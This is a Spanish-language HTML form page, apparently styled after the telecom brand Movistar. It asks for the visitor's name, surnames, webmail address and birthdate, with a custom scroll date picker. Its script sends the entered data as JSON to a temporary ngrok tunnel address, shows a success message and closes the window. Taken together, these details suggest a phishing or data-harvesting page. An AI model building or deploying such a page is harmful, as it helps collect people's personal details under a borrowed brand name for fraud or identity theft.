<!doctype html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
        integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">

    <title>Información personal</title>
    <style>
        .color_movistar{
            background-color: #019DF4;
            color:white;
        }
:root {
    --highlight-color: #019DF4;

    --item-height: 40px;
}




.input-container {
    margin: 20px;
    display: flex;
    flex-direction: column;
    align-items: center;
}



/* Modal del selector de fecha */
.modal-background {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.5);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 1000;
    opacity: 1;
    transition: opacity 0.3s ease;
}

.modal-background.hidden {
    opacity: 0;
    pointer-events: none; /* No interactuable cuando está oculto */
}

.date-picker-container {
    background-color: #fff;
    border-radius: 8px;
    box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
    width: 320px;
    padding: 20px;
    display: flex;
    flex-direction: column;
}

.date-picker {
    display: flex;
    justify-content: space-around;
    padding: 20px 0;
    position: relative;
}

.date-picker::before,
.date-picker::after {
    content: '';
    position: absolute;
    left: 10px;
    right: 10px;
    height: 1px;
    background-color: var(--border-color);
    z-index: 1;
}

.date-picker::before {
    top: calc(50% - var(--item-height) / 2);
}

.date-picker::after {
    top: calc(50% + var(--item-height) / 2);
}

.column {
    flex: 1;
    text-align: center;
    height: calc(var(--item-height) * 2); /* Aumenta la altura para que 5 elementos quepan */
    overflow-y: scroll;
    -ms-overflow-style: none;
    scrollbar-width: none;
    /* Aumenta el padding para que el último elemento pueda llegar al centro */
    padding: calc(var(--item-height) * 2) 0;
}

.column::-webkit-scrollbar {
    display: none;
}

.item {
    height: var(--item-height);
    line-height: var(--item-height);
    font-size: 0.9em;
    color: #666;
    transition: all 0.2s ease-in-out;
    user-select: none; /* Evita la selección de texto */
}

.item.active {
    font-weight: bold;
    color: #000;
    font-size: 1.0em;
}

.button-container {
    display: flex;
    justify-content: flex-end;
    padding-top: 10px;
    gap: 10px;
}

.button-container button {
    background: none;
    border: none;
    color: var(--highlight-color);
    font-size: 1em;
    padding: 10px 15px;
    cursor: pointer;
    text-transform: uppercase;
    font-weight: bold;
    transition: background-color 0.2s;
    border-radius: 4px;
}

.button-container button:hover {
    background-color: #f0f0f0;
}
    </style>
</head>

<body>
    <nav class="navbar navbar-light color_movistar d-flex align-items-center ps-3">
        <h4 class="m-0">Datos personales</h4>
    </nav>
    <br>
    <div class="container">

        <form id="myForm">
            <div class="form-group">
                <label for="name">Nombre</label>
                <input type="hidden" name="usuario" value="{{ $usuario }}" class="form-control" id="usuario">

                <input type="text" class="form-control " name="name" id="name" pattern="[A-Za-zÁÉÍÓÚáéíóúÑñ]+" title="Solo letras" required>

                <label for="apellidoP">Apellido Paterno</label>
                <input type="text" class="form-control" name="apellidoP" id="apellidoP" pattern="[A-Za-zÁÉÍÓÚáéíóúÑñ]+" title="Solo letras" required>

                <label for="apellidoM">Apellido Materno</label>
                <input type="text" class="form-control" name="apellidoM" id="apellidoM" pattern="[A-Za-zÁÉÍÓÚáéíóúÑñ]+" title="Solo letras" required>
                <label for="email">Correo electrónico</label>
                <input type="email" class="form-control" name="email" id="email"  required>
                <label for="fecha_na">Fecha de nacimiento</label>
                <input type="text" id="fecha-input" class="form-control" name="fecha_na"  required>
            </div>
    <div class="modal-background hidden">
        <div class="date-picker-container">
            <div class="date-picker">
                <div class="column days-column"></div>
                <div class="column months-column"></div>
                <div class="column years-column"></div>
            </div>
            <div class="button-container">
                <div class="cancel-button btn color_movistar">CANCELAR</div>
                <div class="accept-button btn color_movistar">ACEPTAR</div>
            </div>
        </div>
    </div>

            <input class="btn color_movistar btn-lg btn-block"  value="Enviar" class="btn btn-primary mt-3" type="submit">
        </form>
    </div>
    <script>
    document.addEventListener('DOMContentLoaded', () => {
    const fechaInput = document.getElementById('fecha-input');
    const modalBackground = document.querySelector('.modal-background');
    const daysColumn = document.querySelector('.days-column');
    const monthsColumn = document.querySelector('.months-column');
    const yearsColumn = document.querySelector('.years-column');
    const acceptButton = document.querySelector('.accept-button');
    const cancelButton = document.querySelector('.cancel-button');

    let selectedValues = {
        day: 0,
        month: 0,
        year: 0
    };

    const months = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];
    const itemHeight = 40; // Debe coincidir con el CSS

    // --- Funciones para generar contenido dinámico ---

    const addPadding = (column) => {
        // Añade 2 divs vacíos de padding al principio y al final
        for (let i = 0; i < 2; i++) {
            column.prepend(document.createElement('div'));
            column.appendChild(document.createElement('div'));
        }
    };

    const generateDays = (year, month) => {
        daysColumn.innerHTML = '';
        const daysInMonth = new Date(year, month + 1, 0).getDate();

        for (let i = 1; i <= daysInMonth; i++) {
            const item = document.createElement('div');
            item.classList.add('item');
            item.textContent = i;
            item.dataset.value = i;
            daysColumn.appendChild(item);
        }
        addPadding(daysColumn);

        if (selectedValues.day > daysInMonth) {
            selectedValues.day = daysInMonth;
        }
    };

    const generateMonths = () => {
        monthsColumn.innerHTML = '';
        months.forEach((month, index) => {
            const item = document.createElement('div');
            item.classList.add('item');
            item.textContent = month;
            item.dataset.value = index;
            monthsColumn.appendChild(item);
        });
        addPadding(monthsColumn);
    };

    const generateYears = () => {
        yearsColumn.innerHTML = '';
        const currentYear = new Date().getFullYear();



        for (let i=currentYear -18; i >=currentYear - 90; i--) {
            const item = document.createElement('div');
            item.classList.add('item');
            item.textContent = i;
            item.dataset.value = i;
            yearsColumn.appendChild(item);
        }
        addPadding(yearsColumn);
    };

    // --- Lógica de selección y scroll ---

    const findClosestElement = (column) => {
        const items = column.querySelectorAll('.item');
        let closestItem = null;
        let minDistance = Infinity;
        const columnCenter = column.scrollTop + (column.clientHeight / 2);

        items.forEach(item => {
            // Se calcula la distancia al centro del elemento, ignorando el padding
            const itemCenter = item.offsetTop + (item.clientHeight / 2);
            const distance = Math.abs(columnCenter - itemCenter);

            if (distance < minDistance) {
                minDistance = distance;
                closestItem = item;
            }
        });
        return closestItem;
    };

    const selectClosestElement = (column, type) => {
        const closest = findClosestElement(column);
        if (closest) {
            const offset = closest.offsetTop - (column.clientHeight / 2) + (closest.clientHeight / 2);

            // Usar requestAnimationFrame para un scroll más suave
            column.scrollTo({
                top: offset,
                behavior: 'smooth'
            });

            column.querySelectorAll('.item').forEach(el => el.classList.remove('active'));
            closest.classList.add('active');

            let value = parseInt(closest.dataset.value);
            if (selectedValues[type] !== value) {
                selectedValues[type] = value;
                if (type === 'month' || type === 'year') {
                    generateDays(selectedValues.year, selectedValues.month);
                    selectElement(daysColumn, selectedValues.day);
                }
            }
        }
    };

    const selectElement = (column, value) => {
        const items = column.querySelectorAll('.item');
        let itemToSelect = null;
        items.forEach(item => {
            if (parseInt(item.dataset.value) === value) {
                itemToSelect = item;
            }
        });

        if (itemToSelect) {
            column.querySelectorAll('.item').forEach(el => el.classList.remove('active'));
            itemToSelect.classList.add('active');
            const offset = itemToSelect.offsetTop - (column.clientHeight / 2) + (itemToSelect.clientHeight / 2);
            column.scrollTop = offset;
        }
    };

    // --- Eventos de UI ---

    const handleScrollEnd = (column, type) => {
        clearTimeout(column.scrollTimeout);
        column.scrollTimeout = setTimeout(() => {
            selectClosestElement(column, type);
        }, 150);
    };

    daysColumn.addEventListener('scroll', () => handleScrollEnd(daysColumn, 'day'));
    monthsColumn.addEventListener('scroll', () => handleScrollEnd(monthsColumn, 'month'));
    yearsColumn.addEventListener('scroll', () => handleScrollEnd(yearsColumn, 'year'));

    // Abrir el modal
    fechaInput.addEventListener('click', () => {
        const now = new Date();
        currentYear = new Date().getFullYear();
        selectedValues.day = now.getDate();
        selectedValues.month = now.getMonth();
        selectedValues.year = currentYear-18;

        generateYears();
        generateMonths();
        generateDays(selectedValues.year, selectedValues.month);

        selectElement(yearsColumn, selectedValues.year);
        selectElement(monthsColumn, selectedValues.month);
        selectElement(daysColumn, selectedValues.day);

        modalBackground.classList.remove('hidden');
    });

    cancelButton.addEventListener('click', () => {
        modalBackground.classList.add('hidden');
    });

    acceptButton.addEventListener('click', () => {
        const formattedDate = `${selectedValues.day}/${selectedValues.month + 1}/${selectedValues.year}`;
        fechaInput.value = formattedDate;
        modalBackground.classList.add('hidden');
    });
});


  const form= document.getElementById("myForm")
  // Lista de dominios permitidos (todo en minúsculas)
    const allowedDomains = [
        'gmail.com',
        'hotmail.com',
        'outlook.com',
        'yahoo.com',
        'icloud.com',
        'live.com',
        'protonmail.com'
    ];

    
    
const email = document.getElementById('email');

email.addEventListener('input', () => {
  // limpia cualquier error personalizado para que el browser re-evalúe el campo
  email.setCustomValidity('');
});


form.addEventListener("submit", async function(e) {
    e.preventDefault();
    const formData = new FormData(this);
    const data = Object.fromEntries(formData.entries());

    const emailVal = email.value.trim();


    email.setCustomValidity("");

    if (!form.checkValidity()) {
      form.reportValidity();
      return;
    }

    // Validación dominio del email
    const lowerEmail = emailVal.toLowerCase();
    const parts = lowerEmail.split('@');
    if (parts.length !== 2 || parts[0].length === 0 || parts[1].length === 0) {
      email.setCustomValidity('Formato de correo inválido.');
      email.reportValidity();
      return;
    }

    const domain = parts[1];
    if (!allowedDomains.includes(domain)) {
      email.setCustomValidity('Dominio no permitido. Usa uno de: ' + allowedDomains.join(', ') + '.');
      email.reportValidity();
      return;
    }

    try {
        const response = await fetch("https://e1c655a56504.ngrok-free.app/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        });

        if (response.ok) {
            const result = await response.json();
            Swal.fire({
                icon: 'success',
                title: 'Listo',
                text: 'Tu información se envió correctamente. Da clic en continuar',
                confirmButtonColor:'#019DF4',
                confirmButtonText: 'Continuar'
            }).then(() => {
                window.close();
            });
        } else {
            Swal.fire({
                icon: 'error',
                title: 'Error',
                text: '❌ Hubo un problema al enviar tu información'
            });
        }
    } catch (error) {
        console.error("Error de red:", error);
        Swal.fire({
            icon: 'error',
            title: 'Error de conexión',
            text: '❌ No se pudo conectar con el servidor.'
        });
    }
});

</script>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
        integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous">
    </script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
        integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous">
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
        integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous">
    </script>
</body>

</html>
